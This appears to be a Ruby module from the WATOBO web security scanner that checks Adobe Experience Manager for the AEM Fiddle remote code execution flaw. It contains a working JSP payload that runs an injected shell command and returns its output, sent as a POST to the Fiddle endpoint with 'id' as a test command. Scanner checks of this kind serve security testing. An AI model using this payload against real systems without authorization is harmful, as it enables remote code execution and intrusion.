# @private
module Watobo #:nodoc: all
  module Modules
    module Active
      module Aem
        #class Dir_indexing < Watobo::Mixin::Session
        class Aem_fiddle_rce < Watobo::ActiveCheck

          FIDDLE_COMMAND_TEMPLATE = <<EOF
<%@ page import="java.io.*" %>
<% 
Process proc = Runtime.getRuntime().exec("§INJ§");
BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
StringBuilder sb = new StringBuilder();
String s = null;
while ((s = stdInput.readLine()) != null) {
sb.append(s + "\\\\n");
}
String output = sb.toString();
%>
<%= output %>&scriptext=jsp&resource=
EOF

          @info.update(
              :check_name => 'AEM Fiddle RCE', # name of check which briefly describes functionality, will be used for tree and progress views
              :description => "This module checks if app is vulnerable for AEM Fiddle RCE.", # description of checkfunction
              :author => "Andreas Schmidt", # author of check
              :version => "1.0", # check version
              :check_group => "AEM"
          )

          @finding.update(
              :threat => 'RCE', # thread of vulnerability, e.g. loss of information
              :class => "AEM Fiddle RCE", # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
              :type => FINDING_TYPE_VULN, # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
              :rating => VULN_RATING_CRITICAL
          )

          def create_payload(cmd)
            payload = 'scriptdata='

            payload << URI.encode_www_form_component( FIDDLE_COMMAND_TEMPLATE.gsub(/§INJ§/, cmd).strip )
            payload << '&scriptext=jsp&resource='
          end


          def initialize(project, prefs = {})
            super(project, prefs)

            @fiddle_found = false
            @fiddle_path = '/cqa/etc/acs-tools/aem-fiddle'
            @fiddle_file = '_jcr_content.run.html'
            @fiddle_cmds = []
            @fiddle_cmds << ['id', 'id=.*gid=']

          end

          def reset()
            @checked_locations = []
          end

          def generateChecks(chat)

            path = chat.request.path
            Watobo::Utils.merge_paths(path, @fiddle_path) do |path|

              return if @fiddle_found
              @fiddle_cmds.each do |cmd, pattern|
                unless @checked_locations.include? path
                  @checked_locations << path
                  #
                  # via JSON Extension

                  checker = proc {
                    begin
                      test = chat.copyRequest
                      test.method = 'POST'
                      path = File.join(path, @fiddle_file)
                      test.path = path
                      test.set_header 'Content-Type: application/x-www-form-urlencoded'
                      test.set_body create_payload(cmd)

                      request, response = doRequest(test, :default => true)

                      if response.status and response.has_body?
                        if response.body.to_s =~ /#{pattern}/
                          @fiddle_found = true
                          addFinding(request, response,
                                     :test_item => "#{request.url}",
                                     :proof_pattern => "#{pattern}",
                                     :chat => chat,
                                     :threat => "RCE",
                                     :title => "[#{cmd}]"
                          )
                        end
                      end

                    rescue => bang
                      puts bang
                      puts bang.backtrace if $DEBUG
                      binding.pry
                    end

                    [request, response]

                  }
                  yield checker
                end
              end
            end
          end

        end
      end
    end
  end
end

